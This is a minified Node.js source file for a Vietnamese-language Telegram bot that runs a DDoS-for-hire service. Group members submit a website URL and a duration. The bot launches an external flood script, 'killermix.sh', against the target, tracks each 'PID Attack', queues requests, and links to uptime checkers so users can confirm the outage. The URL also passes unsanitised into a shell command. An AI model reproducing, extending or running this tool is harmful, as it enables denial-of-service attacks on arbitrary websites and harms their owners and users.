const TelegramBot=require('node-telegram-bot-api'),{exec}=require('child_process'),fs=require('fs'),path=require('path');
const C={admin:'adminid1.txt',group:'groupid.txt',blacklist:'blacklist1.txt',token:'token2.txt',script:'killermix.sh'},L={slot:1,concurrent:2,maxTime:120};
let t,a=new Set(),g=new Set(),b=[],y=!0,q=[],x=new Map(),m=path.basename(C.script,'.sh').toUpperCase();

try{t=fs.readFileSync(C.token,'utf8').trim();if(!t)throw new Error('❌ Token không hợp lệ');
if(fs.existsSync(C.admin))a=new Set(fs.readFileSync(C.admin,'utf8').split('\n').filter(Boolean));
if(fs.existsSync(C.group))g=new Set(fs.readFileSync(C.group,'utf8').split('\n').filter(Boolean));
if(fs.existsSync(C.blacklist))b=fs.readFileSync(C.blacklist,'utf8').split('\n').filter(Boolean);}catch(e){console.error(e.message);process.exit(1);}

const bot=new TelegramBot(t,{polling:!0}),h=`📜 Hướng dẫn:\n<code>https://site.com 120</code>\n⚠️ Tối đa: ${L.maxTime}s\nAdmin: <code>/pkill</code>, <code>/on</code>, <code>/off</code>\nCONTACT: @revenvenger`;

bot.on('message',msg=>{
const {chat:{id:c},text,from:{id:u,username:n,f:n2},date}=msg,ad=a.has(u+''),gr=g.has(c+''),cl=n||n2;
if(date*1000<Date.now()-60000||!gr||!text)return;
if(text.trim()==='/help')return bot.sendMessage(c,`${cl?`@${cl} `:''}${h}`,{parse_mode:'HTML'});
if(text.startsWith('http')){
if(!y)return bot.sendMessage(c,'❌ Bot đang tắt',{parse_mode:'HTML'});
const [h,t]=text.split(' ');if(!h||isNaN(t))return bot.sendMessage(c,'🚫 Sai định dạng: <code>https://site.com 60</code>',{parse_mode:'HTML'});
if(b.some(b=>h.includes(b)))return bot.sendMessage(c,'❌ URL bị chặn',{parse_mode:'HTML'});
const du=Math.min(parseInt(t),L.maxTime);
if([...x.values()].filter(v=>v.u===u).length>=L.slot)return bot.sendMessage(c,`❌ Giới hạn ${L.slot} tiến trình`,{parse_mode:'HTML'});
if(x.size>=L.concurrent){q.push({u,h,t:du,c,cl});return bot.sendMessage(c,'⏳ Đang chờ...',{parse_mode:'HTML'});}
const pid=Math.floor(Math.random()*9000+1000);x.set(pid,{u,h,du,c,cl});
bot.sendMessage(c,JSON.stringify({Status:"✨🚀🛸 Successfully 🛸🚀✨",Caller:`@${cl}`,"PID Attack":pid,Website:h,Time:`${du} Giây`,Maxslot:L.slot,Maxtime:L.maxTime,Methods:m,ConcurrentAttacks:x.size,StartTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'🔍 Check Host',url:`https://check-host.net/check-http?host=${h}`},{text:'🌐 Host Tracker',url:`https://www.host-tracker.com/en/ic/check-http?url=${h}`}]]}});
exec(`./${C.script} "${h}" "${du}"`,{shell:'/bin/bash'},(e)=>{if(e)return;
bot.sendMessage(c,JSON.stringify({Status:"👽 END ATTACK 👽",Caller:`@${cl}`,"PID Attack":pid,Website:h,Methods:m,Time:`${du} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML'});x.delete(pid);
if(q.length&&x.size<L.concurrent){const n=q.shift();bot.sendMessage(n.c,`📥 Bắt đầu: ${n.h} ${n.t}s`);bot.emit('message',{chat:{id:n.c},from:{id:n.u,username:n.cl},text:`${n.h} ${n.t}`});}});return;}
if(!ad)return;
if(text.trim()==='/pkill'){exec('pkill -9 -f "node.*\\.js"',()=>{bot.sendMessage(c,'✅ Đã dừng tất cả tiến trình',{parse_mode:'HTML'});x.clear();q=[];});return;}
if(text.trim()==='/on'){y=!0;bot.sendMessage(c,'✅ Bot đã bật',{parse_mode:'HTML'});return;}
if(text.trim()==='/off'){y=!1;bot.sendMessage(c,'✅ Bot đã tắt',{parse_mode:'HTML'});return;}});
